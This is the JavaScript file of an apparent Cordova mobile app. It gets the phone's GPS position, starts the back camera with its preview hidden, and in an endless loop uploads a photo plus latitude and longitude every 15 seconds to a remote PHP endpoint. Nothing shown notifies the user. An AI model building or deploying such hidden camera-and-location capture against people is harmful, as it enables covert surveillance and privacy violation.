var lat = 0;
var lon = 0;

var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {
  },
  receivedEvent: function(id) {}
};

var photograph=function() {
  let url='http://smwx.org/upload.php';
      CameraPreview.setFlashMode('off');
      CameraPreview.takePicture({height:1280, width:720, quality:65}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post(url, {image: pic, lat: lat, lon: lon, uuid: 123, timeout: 50000}, function(data, status, xhr) { }).fail(function(error, status, xhr) { });
      });
}

function photoDelay() {
  return new Promise(resolve =>  setTimeout(resolve, 15000));
}

function msg(m) {
  alert(m);
}

async function photos() {
  await photoDelay();  
  photograph();
}

async function processArray() {
  for (var i=0; i<Infinity; i++) { 
     await photos();
  };
}

function onError(e) {
  alert('code='+e.code+'\n'+e.message);
}

function onSuccess(position) {
  lat=position.coords.latitude;
  lon=position.coords.longitude;
}

app.initialize();
//var uuid=device.uuid;
//alert(uuid);
navigator.geolocation.getCurrentPosition(onSuccess, onError, { timeout: 10000 });
CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
CameraPreview.hide();
processArray();
